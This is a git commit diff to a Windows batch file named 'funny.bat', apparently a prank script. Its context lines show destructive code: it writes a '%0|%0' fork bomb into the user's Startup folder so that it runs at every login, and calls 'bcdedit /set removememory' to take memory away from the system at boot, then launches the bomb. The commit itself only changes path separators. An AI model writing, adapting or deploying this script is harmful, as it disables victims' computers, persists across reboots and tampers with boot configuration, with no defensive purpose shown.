b9d4aa46f483f44f224362421f3f82ef4913e49a
frogillius <151787619+frogillius@users.noreply.github.com>
2024-06-11 19:45:38 -0700

    Update funny.bat

--- funny.bat
+++ funny.bat
@@ -1,6 +1,6 @@
 @echo off 
 cd
-cd "c:\Users\%USERNAME%\AppData\Microsoft\Windows\Start Menu\Programs\Startup"
+cd "c:/Users/%USERNAME%/AppData/Microsoft/Windows/Start Menu/Programs/Startup"
 echo -e "%0|%0" > funny.bat
 
 echo Calculating total system memory
@@ -21,6 +21,6 @@ echo Will be getting rid of %c% bytes of memory
 bcdedit.exe /set removememory %c% 
 
 
-cd "c:\Users\%USERNAME%\AppData\Microsoft\Windows\Start Menu\Programs\Startup"
+cd "c:/Users/%USERNAME%/AppData/Microsoft/Windows/Start Menu/Programs/Startup"
 funny.bat
  
